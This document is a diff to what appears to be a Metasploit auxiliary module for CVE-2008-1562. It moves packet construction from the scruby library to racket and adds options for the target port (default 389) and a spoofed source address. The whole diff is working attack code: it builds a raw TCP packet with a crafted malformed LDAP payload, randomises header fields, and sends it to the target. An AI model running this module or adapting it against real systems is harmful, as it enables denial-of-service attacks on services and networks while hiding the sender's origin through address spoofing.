@@ -6,8 +6,7 @@
 ##
 
 require 'msf/core'
-require 'scruby'
-
+require 'racket'
 
 class Metasploit3 < Msf::Auxiliary
 
@@ -28,7 +27,13 @@ class Metasploit3 < Msf::Auxiliary
 				[
 					[ 'CVE', '2008-1562' ],
 				],
-			'DisclosureDate' => 'Mar 28 2008')
+			'DisclosureDate' => 'Mar 28 2008')		
+			
+		register_options([
+			OptInt.new('RPORT', [true, 'The destination port', 389]),
+			OptAddress.new('SHOST', [false, 'This option can be used to specify a spoofed source address', nil])
+		], self.class)
+	
 	end
 
 	def run
@@ -39,24 +44,28 @@ class Metasploit3 < Msf::Auxiliary
 		
 		connect_ip	
 
-		pkt =( 
-			Scruby::IP.new(
-				:dst   => "#{rhost}",
-				:flags => 2,
-				:len   => 121,
-				:ttl   => 128,
-				:id    => 0xba6b,
-				:chksum => 0x1e86
-			)/Scruby::TCP.new(
-				:dport => 389,
-				:seq   => 1980536076,
-				:ack   => 3945163501, 
-				:window => 64833,
-				:chksum => 0xa8ce,
-				:flags => 18
-			)/"0O\002\002;\242cI\004\rdc=#{m},dc=#{m}\n\001\002\n\001\000\002\001\000\002\001\000\001\001\000\241'\243\016"
-		).to_net
+		n = Racket::Racket.new
+
+		n.l3 = Racket::IPv4.new
+		n.l3.src_ip = datastore['SHOST'] || Rex::Socket.source_address(rhost)
+		n.l3.dst_ip = rhost
+		n.l3.protocol = 6
+		n.l3.id = rand(0x10000)
 		
+		n.l4 = Racket::TCP.new
+		n.l4.src_port = rand(65535)+1
+		n.l4.seq = rand(0x100000000)
+		n.l4.ack = rand(0x100000000)
+		n.l4.flag_psh = 1
+		n.l4.flag_ack = 1
+		n.l4.dst_port = datastore['RPORT'].to_i
+		n.l4.window = 3072
+		n.l4.payload = "0O\002\002;\242cI\004\rdc=#{m},dc=#{m}\n\001\002\n\001\000\002\001\000\002\001\000\001\001\000\241'\243\016"
+
+		n.l4.fix!(n.l3.src_ip, n.l3.dst_ip, '')	
+	
+		pkt = n.pack
+
 		ip_write(pkt)
 
 		disconnect_ip
